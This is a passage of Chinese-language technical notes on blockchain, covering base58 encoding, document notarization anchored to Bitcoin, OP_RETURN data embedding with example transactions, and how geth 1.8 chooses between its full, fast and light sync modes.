激励层主要实现区块链代币的发行和分配机制，该层主要出现在公有链中，用以激励遵守规则参与记账的节点，惩罚不遵守规则的节点，促使整个系统朝着良性循环的方向发展。

5. 合约层

合约层主要封装各类脚本、算法和智能合约，赋予账本可编程的特性。通过虚拟机的方式运行代码实现智能合约的功能，比如以太坊的以太坊虚拟机。

6. 应用层

应用层封装了区块链的各种应用场景和案例，如搭建在以太坊上的各类去中心化的应用。

### 理论/技术点

#### 图灵完全

图灵完全性通常指具有无限存储能力的通用物理机器或编程语言。简单来说，一切可计算的问题都能计算（给定足够的时间和存储），这样的虚拟机或者编程语言就叫图灵完备的。

#### base58

用于 bitcoin 中使用的一种独特的编码方式，主要用于产生 bitcoin  的钱包地址。相比 base64，base58 不使用数字"0"，字母大写"O"，字母大写"I"，和字母小写"l"，以及"+"和"/"符号。
设计 base58 主要的目的是：

1. 避免混淆。在某些字体下，数字 0 和字母大写 O，以及字母大写 I 和字母小写 l 会非常相似。
2. 不使用"+"和"/"的原因是非字母或数字的字符串作为帐号较难被接受。
3. 没有标点符号，通常不会被从中间分行。
4. 大部分的软件支持双击选择整个字符串。

**base58 与 base64 的差异：**base64 编码中使用直接截取 3 个字符转 4 个字符的方法进行转换，而是采用我们数学上经常使用的进制转换方法——辗转相除法。

### 应用场景

区块链属于一种去中心化的记录技术。参与到系统上的节点，可能不属于同一组织，彼此互不信任；区块链数据由所有节点共同维护，每个参与维护节点都能复制获得一份完整记录的拷贝。跟传统的数据库技术相比，其特点应该包括：

- 维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改

- 去中心化，或者说多中心化，无集中的控制，实现上尽量分布式

- 可以通过密码学的机制来确保交易无法抵赖和破坏，并尽量保护用户信息和记录的隐私性

更进一步的，还可以将智能合约跟区块链结合到一起，让其提供除了交易功能外更灵活的合约功能，执行更为复杂的操作（实际上，比特币区块链已经支持简单的脚本计算）。这样扩展之后的区块链，已经超越了单纯数据记录的功能了，实际上带有“普适计算”的意味了。

| 定位             | 功能     | 智能合约           | 一致性       | 权限 | 类型   | 性能   | 代表        |
| ---------------- | -------- | ------------------ | ------------ | ---- | ------ | ------ | ----------- |
| 公信的数字货币   | 记账功能 | 不带有或较弱       | PoW          | 无   | 公有链 | 较低   | 比特币      |
| 公信的交易处理   | 智能合约 | 图灵完备           | PoW、PoS     | 无   | 公有链 | 受限   | 以太坊      |
| 带权限的交易处理 | 商业处理 | 多种语言，图灵完备 | 多种，可插拔 | 支持 | 联盟链 | 可扩展 | Hyperledger |

#### 存证业务

**联盟链和公有链结合的存证业务**

存证业务的流程相当明晰，首先是双方基于电子签名技术，在电子合同上签约，第三方存证平台提供一个服务，将合同文件进行哈希后，将哈希值妥善存储即可。

但这里存在一个问题，那就是第三方平台本身的信用。第三方平台出于某种利益，是否会更改合同的哈希值，一旦更改，该合同的有效性就会受到质疑，从而引发纠纷。

为了解决这个问题，公证通（Factom）等公司选择将文件的哈希值存入比特币的区块链中，由于比特币区块链的不可更改性，即便是公证通这家存证公司本身都无法篡改其哈希值，从而在根本上保障了合同真伪校验的有效性。

但是，使用公有链依然具有局限性，一是公有链的确认速度很慢，二是公有链的交易手续费会越来越高，导致业务成本高。

因此，我建议将联盟链置于用户数据和公有链之间。如下图所示，是保全网的方案，采用了 Factom 的技术，而联盟链公司可以将中间的锚定链替换为自身的联盟链，从而提高用户存证的确认速度，并且多个数据最终做一次哈希，可大大降低比特币网络的交易次数，从而降低成本。

![img](pic/blockchain/deposit.png)

**联盟链的作用和公有链的作用**

最终必然有一个疑问，既然底层最终锚定了公有链，那么联盟链的作用在哪里。我认为联盟链的作用有三个，一是，如果某个机构希望在本地拥有其文件的哈希数据，那么只需要布置一个联盟链的节点即可。二是，联盟链可以大大提高存证的确认速度，同时联盟链未来可以支持更高的存证并发数。三是，即便最终想要切断联盟链和公有链的联系，有一个联盟链在中间层做保障，也是非常方便的一件事。

当联盟链中的节点足够多之后，其存证的公信力也将愈发强大，但在联盟链推动的初期，若没有底层公有链的信用加成，前期推动的难度非常大，要花费极多的口舌去进行市场教育，这也是联盟链公司一个不可忽视的机会成本。

**电子合同及合同存证的巨大价值**

人类社会之所以得到发展，“契约精神”起到了不可磨灭的作用，但是持续了几千年的纸质“契约”，纸质合同，已经难以跟上这个飞速发展的互联网世界。

设想一个人从小到大的成长过程，要接触各种各样的合同：入学有合同、银行开户有合同、买房有合同、买车有合同，说得夸张一些，可谓是“凡事皆契约”，“一切皆合同”。甚至我让同事帮我买一杯奶茶，欠个15块钱，本质上也是一个口头契约。但如果所有的合同都是纸质的，谁又能保存和检索如此多的纸质合同呢？

对企业来说更是如此，仅仅是员工的聘用合同，这一类的合同，就需要整个HR部门花费巨大的力气保存和检索，万一丢失纸质合同，又会引发一系列的纷争。所以，这是一个亟待解决的重要问题。

电子合同的网上签约、第三方存管、合同真伪查询、一站式的合同模板提供、合同规范性的校验，这些都是一个大大的蓝海市场，切不可错过。

**存证业务的进一步拓展**

电子合同仅仅是存证业务中的一种而已，之所以选择从合同的存证切入市场，是因为这个场景确实在现阶段成为了企业和个人的一个痛点。

未来，除了合同以外的任何电子证据都可以存储在区块链存证平台中，例如人的身份证明，或者票据、学历证明、工作履历等等。

因此，区块链可以成为整个社会信用体系得以构建的底层基础设施。

#### 比特币数据记录

> 落地应用：[docproof ](https://www.docproof.org/)

比特币的去中心特点和时间戳账本机制，即区块链技术，其潜在运用将大大超越支付领域。许多开发者试图充分发挥交易脚本语言的安全性和可恢复性优势，将其运用于电子公证服务、证券认证和智能合约等领域。很多早期的开发者利用比特币这种能将交易数据放到区块链上的技术进行了很多尝试，例如，为文件记录电子指纹，则任何人都可以通过该机制在特定的日期建立关于文档存在性的证明。

运用比特币的区块链技术存储与比特币支付不相关数据的做法是一个有争议的话题。许多开发者认为其有滥用的嫌疑，因而试图予以阻止。另一些开发者则将之视为区块链技术强大功能的有力证明，从而试图给予大力支持。那些反对非支付相关应用的开发者认为这样做将引致“区块链膨胀”，因为所有的区块链节点都将以消耗磁盘存储空间为成本，负担存储此类 数据的任务。

更为严重的是，此类交易仅将比特币地址当作自由组合的 20 个字节而使用，进而会产生不能用于交易的 UTXO。因为比特币地址只是被当作数据使用，并不与私钥相匹配，所以会导致 UTXO 不能被用于交易，因而是一种伪支付行为。因此，这些交易永远不会被花费，所以永远不会从 UTXO 集中删除，并导致 UTXO 数据库的大小永远增加或“膨胀”。

在 0.9 版的比特币核心客户端上，通过采用 OP_RETURN 操作符最终实现了妥协。OP_RETURN 允许开发者在交易输出上增加 80 字节的非交易数据。然后，与伪交易型的 UTXO 不同，OP_RETURN 创造了一种明确的可复查的非交易型输出，此类数据无需存储于 UTXO 集。OP_RETURN 输出被记录在区块链上，它们会消耗磁盘空间，也会导致区块链规模的增加，但它们不存储在 UTXO 集中，因此也不会使得 UTXO 内存膨胀，更不会以消耗代价高昂的内存为代价使全节点都不堪重负。OP_RETURN 脚本的样式：

```basic
OP_RETURN <data>
```

“data”部分被限制为 80 字节，且多以哈希方式呈现，如 32 字节的 SHA256 算法输出。许多应用都在其前面加上前缀以辅助认定。例如，电子公正服务的证明材料采用 8 个字节的前缀“DOCPROOF”，在十六进制算法中，相应的 ASCII 码为 44 4f 43 50 52 4f 4f 46。

请记住 OP_RETURN 不涉及可用于支付的解锁脚本的特点， OP_RETURN 不能使用其输出中所锁定的资金，因此它也就没有必要记录在蕴含潜在成本的 UTXO 集中，所以 RETURN 实际是没有成本的。

OP_RETURN 常为一个金额为 0 的比特币输出， 因为任何与该输出相对应的比特币都会永久消失。假如一笔 OP_RETURN 被作为一笔交易的输入，脚本验证引擎将会阻止验证脚本的执行，将标记交易为无效。如果你碰巧将 OP_RETURN 的输出作为另一笔交易的输入，则该交易是无效的。

**举例**

[交易 0xb17a027a8f7ae0db4ddbaa58927d0f254e97fce63b7e57e8e50957d3dad2e66e](https://www.blockchain.com/btc/tx/b17a027a8f7ae0db4ddbaa58927d0f254e97fce63b7e57e8e50957d3dad2e66e)

[交易 0xe89e09ac184e1a175ce748775b3e63686cb1e5fe948365236aac3b3aef3fedd0](https://www.blockchain.com/btc/tx/e89e09ac184e1a175ce748775b3e63686cb1e5fe948365236aac3b3aef3fedd0)

如下，两个交易输出脚本只包含数据（十六进制），解码分别对应

 `Yuki will you marry me ? Tetsu.`

 `Yes I will. Yuki.`

![](pic/blockchain/op_return1.png)

![](pic/blockchain/op_return2.png)

#### 以太坊数据记录

以太坊在交易中数据字段中添加待记录的数据，[如下所示](https://etherscan.io/tx/0xb1ed364e4333aae1da4a901d5231244ba6a35f9421d4607f7cb90d60bf45578a)

![](pic/blockchain/eth_record.png)

## 以太坊 geth 源码

> **源码版本：**基于 release 1.8 分支

### 同步模式

#### 同步模式的定义

在文件 eth/downloader/modes.go 定义了同步模式，主要包含如下三种同步模式 full/fast/light，详见定义

![](pic/blockchain/eth_sync_mode.png)

SyncMode 类型定义 `type SyncMode int`，实际数据类型为 `int`，三种同步模式的差异如下：

| 同步模式  | 特点                                                         | 备注     |
| --------- | ------------------------------------------------------------ | -------- |
| FullSync  | 同步完整的区块信息                                           | 全量同步 |
| FastSync  | 快速同步 header（至最新高度 X），然后同步（最新高度 X 之后的）完整的<br />区块信息 | 快速同步 |
| LightSync | 只同步 header，同步完成之后终止                              | 轻量同步 |

#### 默认同步模式

在 cmd/utils/flags.go 文件内定义了项目启动时的基本配置参数

![](pic/blockchain/eth_default_sync_mode.png)

然后，查看 eth.DefaulConfig 结构中关于 SyncMode 的定义，如下所示

![](pic/blockchain/eth_default_sync_mode2.png)

因此，默认的同步模式为 FastSync，即，快速同步。

#### 同步模式的自动切换

然后，根据实际同步情况，可能调整同步模式，在 eth/handler.go 中方法 NewProtocolManager 有如下代码逻辑

![](pic/blockchain/adjust_sync_mode.png)

**解读：**即使启动节点使用默认同步模式或者通过指定 FastSync 快速同步模式，节点启动时，检查当前区块高度，如果已经同步高一部分数据时，此高度大于 0，程序自动将同步模式切换成 FullSync 全量同步模式，并打印警告信息，如下所示

```go
// Figure out whether to allow fast sync or not
if mode == downloader.FastSync && blockchain.CurrentBlock().NumberU64() > 0 {
	log.Warn("Blockchain not empty, fast sync disabled")
	mode = downloader.FullSync
}
```

#### 总结

- 同步模式共有三种：全量、快速、轻量，默认采用快速同步模式
- 同步模式可能发生自动切换
- 同步区块数据量的多少与使用同步模式 FullSync 的时机、**同步节点启停次数有一定关系**